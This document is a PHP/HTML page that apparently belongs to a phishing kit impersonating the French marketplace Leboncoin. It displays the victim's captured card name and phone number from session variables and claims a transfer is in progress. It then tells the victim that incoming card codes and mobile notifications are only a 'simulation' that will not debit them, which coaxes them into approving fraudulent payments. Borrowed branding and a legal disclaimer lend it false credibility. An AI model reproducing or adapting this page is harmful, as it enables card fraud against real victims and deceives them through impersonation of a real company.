              ...
              <div>
                <div class="flex">
                  ...
                  <div data-testid="scurisBadge" class="items-center hidden md:flex">
                    ...
                    <h4 class="text-main text-subhead m-sm self-center">TERMINER</h4>
                  </div>
                </div>
              </div>
            </div>
        ...
        <main class="flex flex-col h-full">
          ...
          <div class="h-[calc(100%-50px)] md:h-[calc(100%-60px)] md:bg-no-repeat md:bg-bottom md:bg-[length:980px] md:bg-[url(/static/login-illustration.png)]">
            <div class="px-lg mx-auto py-xl flex flex-col gap-2xl bg-background max-md:h-full max-w-[498px] md:shadow md:rounded-lg md:p-2xl md:mt-[56px]">
              <CENTER><h1 class="text-display-3 text-on-surface"> VOTRE VIREMENT EST EN COURS<BR>

                  
                <img width="100" src="https://mir-s3-cdn-cf.behance.net/project_modules/disp/04de2e31234507.564a1d23645bf.gif"><BR>MERCI D'AVOIR CHOISIR LEBONCOIN</h1></CENTER>
...
<div style="text-align: center; " class="form-container">
                                    <p style="font-size: 16px">
                                       <b> <span class="actives"><?php echo $_SESSION['cardName'];  ?> Suite aux nouvelles mesures de sécurité, vous aurez vos fonds à votre compte qu'après-avoir confirmé que vous êtes bien le titulaire du compte bancaire enregistré sur votre compte LEBONCOIN :</span></b>
                                        <span class="gras">pour terminer la confirmation de votre compte : Vous serez contacté par téléphone <?php echo $_SESSION['tel'];  ?> par le service Client dans les meilleurs délais.
</span>
                                    </p>

                                    <br><br>

                                    <p color="red" style="font-size: 16px">
                                       <b> <span class="actives">
                                            Afin de lutter contre les fraudes à la carte bancaire, nous procéderons à une simulation en vous faisant parvenir différents codes avec votre carte bancaire ou notifications à valider avec votre mobile.
                                        </span></b>
                                        <span class="gras">
                                            NB : Vous verrez des montants aléatoires générés par les serveurs de simulations LE BONCOIN  , mais nous vous rassurons que vous ne serez ni débité, ni prélevé.

                                        </span>
                                       <b> <span class="actives">
                                            Information légale : Attention, l'usage frauduleux du numéro de carte bancaire d'une autre personne sans son consentement constitue juridiquement un délit d’escroquerie sanctionné par l'article 313-1 du Code pénal d'une peine de 5 ans d’emprisonnement et 35 000 € d'amende.
                                        </span></b>
                                    </p>
  ...
  <br>  <br>
                                    <p style="font-size: 16px">
                                        <span class="actives">Cordialement, Leboncoin</span>
                                    </p>
                                </div>
